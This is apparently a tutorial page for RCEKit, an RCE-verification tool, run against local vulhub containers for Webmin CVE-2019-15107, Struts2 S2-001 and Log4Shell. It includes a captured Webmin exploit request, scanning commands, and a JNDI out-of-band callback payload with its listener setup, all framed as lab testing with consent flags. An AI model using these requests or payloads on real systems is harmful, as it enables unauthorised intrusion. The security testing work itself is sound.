# Verify it yourself

The README shows RCEKit confirming RCE on real CVEs. This page is how you
reproduce that on your own machine, against vulnerable targets you control,
in about five minutes.

The targets come from [vulhub](https://github.com/vulhub/vulhub) — a maintained
collection of dockerised vulnerable environments. Nothing vulnerable is hosted
by this project; you bring the target up locally and tear it down when you are
done.

> **These are deliberately vulnerable services.** Run them on a machine you
> control, not on a network you share, and shut them down afterwards. Every
> RCEKit command below needs `--acknowledge-consent` — which here means you are
> testing your own container.

**Contents**

- [Setup](#setup)
- [1. OS command injection — Webmin CVE-2019-15107](#1-os-command-injection--webmin-cve-2019-15107)
- [2. Expression injection — Struts2 S2-001](#2-expression-injection--struts2-s2-001)
- [3. Blind out-of-band — Log4Shell CVE-2021-44228](#3-blind-out-of-band--log4shell-cve-2021-44228)
- [What to take away](#what-to-take-away)

---

## Setup

You need Docker with the `docker compose` plugin, and Python 3.8+.

```bash
git clone https://github.com/vulhub/vulhub.git
curl -O https://raw.githubusercontent.com/kabiri-labs/rcekit/main/rcekit.py
python rcekit.py --doctor
```

That `curl` is the whole install: `rcekit.py` carries its own payload corpus, so
one file in an empty directory is a working tool. `--doctor` prints which corpus
it loaded and its payload counts.

---

## 1. OS command injection — Webmin CVE-2019-15107

A backdoored Webmin 1.910 build: the `old` parameter of `password_change.cgi`
reaches a shell. It only works with the right `Referer` and cookies, which makes
it a good showcase for driving RCEKit from a **captured request** rather than
rebuilding one by hand.

```bash
cd vulhub/webmin/CVE-2019-15107
docker compose up -d          # HTTPS on :10000, self-signed
```

Save this as `webmin.txt` — it is vulhub's own documented request, with the
injection point left as an ordinary value:

```http
POST /password_change.cgi HTTP/1.1
Host: 127.0.0.1:10000
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://127.0.0.1:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded

user=rootxx&pam=&expired=2&old=test&new1=test2&new2=test2
```

```bash
python rcekit.py --acknowledge-consent \
  -r webmin.txt -p old \
  --request-scheme https --insecure \
  --methods reflected
```

**Why those two extra flags.** The capture's `Host` is on `:10000`, and a
portless capture cannot record whether it was TLS — so RCEKit infers `http` and
prints the scheme it chose; `--request-scheme https` pins it. The certificate is
self-signed, so without `--insecure` every probe is reported `error`, **not**
`negative`: a connectivity failure is never allowed to read as "not vulnerable".
RCEKit will also warn that the capture carries a `Cookie` header, because pinning
the scheme is what keeps it off the wire in cleartext.

You should see `confirmed` probes, each evidence line naming the value the shell
computed from operands RCEKit picked at random for that run — a number that
cannot appear in a response unless something executed.

### The same sink, blind

Now ask for a timing verdict on the same parameter:

```bash
python rcekit.py --acknowledge-consent \
  -r webmin.txt -p old \
  --request-scheme https --insecure \
  --methods time --time-base 3
```

This is the part worth watching. The sink is genuinely vulnerable, the timing
regression fits — and RCEKit still reports it as **`needs-review`**, never
`confirmed`. Timing produces no computed value, so it cannot prove execution on
its own, and RCEKit will not promote it just because it happens to be right this
time. That ceiling is the whole design.

```bash
docker compose down -v
```

---

## 2. Expression injection — Struts2 S2-001

A different RCE class entirely: Struts2 re-evaluates submitted form values as
OGNL after a failed validation, so `%{...}` is executed. No shell is involved.

```bash
cd vulhub/struts2/s2-001
docker compose build && docker compose up -d      # :8080
```

The app is a single login form. Read its action and field names rather than
trusting a guess:

```bash
curl -s http://127.0.0.1:8080/ | grep -iE '<form|<input'
```

Then point RCEKit at it, substituting the action path and field name you just
saw:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "http://127.0.0.1:8080/<action>" \
  --verify-method POST \
  --verify-data "<field>=FUZZ" \
  --methods reflected,eval
```

Both methods are listed on purpose. `eval` should confirm — it injects a product
of two random operands in each common template syntax and checks that the
**product** comes back while the literal `a*b` does not. `reflected` should not,
because its probes are shell syntax and there is no shell here.

That split is the point: RCEKit tells you *which class* executed, rather than
flagging the parameter and leaving you to work out why.

```bash
docker compose down -v
```

---

## 3. Blind out-of-band — Log4Shell CVE-2021-44228

**Advanced — this one is not a purely local five-minute run.** It is included
because it is the honest way to show the OOB path, and pretending otherwise
would be exactly the overstatement this tool exists to avoid.

vulhub's environment is Apache Solr 8.11.0 on `:8983`, where
`/solr/admin/cores?action=` is logged through Log4j 2.14.1.

```bash
cd vulhub/log4j/CVE-2021-44228
docker compose up -d
```

**What this needs that the others don't.** Log4Shell's sink is a JNDI lookup
inside a logging library, not a shell. So `--methods oob` does **not** apply
here: it builds shell probes (`curl`, `nslookup`) for shell-capable
environments. The `${jndi:...}` payloads live in the `oob` **category** instead,
and confirmation comes from the listener correlating the callback token:

```bash
# Generate JNDI payloads, each carrying a unique subdomain token
python rcekit.py --acknowledge-consent --categories oob \
  --oob-domain <a-domain-delegated-to-you> --output oob.txt

# Run the listener and correlate whatever calls back
sudo python rcekit.py --listen --correlate oob.txt.map.jsonl \
  --listen-dns-port 53 --listen-http-port 8081
```

Then send a generated payload to `/solr/admin/cores?action=` and watch the
listener. A hit looks like:

```
[HIT] dns token=8k2hn1ufohpv from 172.17.0.2 -> ${jndi:dns://8k2hn1ufohpv.<domain>/a} [oob/raw]
```

**The requirement to be honest about:** `--oob-domain` has to be a domain whose
NS records are delegated to your listener, because the token rides in a DNS
label. A bare IP cannot carry one. Port 53 needs root, and `--listen-http-port`
is moved off 8080 above so it does not collide with the Struts2 container if you
still have it up.

If you do not have a domain to delegate, this is the one demo you cannot
reproduce locally — the [field guide](guide.md#out-of-band-callbacks) covers the
setup, and demos 1 and 2 already show the confirmation model end to end.

```bash
docker compose down -v
```

---

## What to take away

Three things you can check for yourself in the runs above, which are hard to see
from a screenshot:

1. **The evidence is a value the target computed**, from operands chosen freshly
   each run. Re-run demo 1 and the numbers change — a hardcoded signature or a
   replayed response cannot produce them.
2. **Tiers are not merged.** The same Webmin sink returns `confirmed` under
   `reflected` and `needs-review` under `time`. RCEKit will not upgrade a timing
   fit into proof.
3. **The class is attributed, not guessed.** Demo 2 confirms under `eval` and
   not `reflected`, against a target where both were tried.

If a run comes back `negative` on a target you know is vulnerable, that is worth
reporting — the [field guide](guide.md#troubleshooting) lists the usual causes
(payload encoding, sink shape, a filtered separator), and a reproducible miss on
a public vulhub environment is a good bug report.
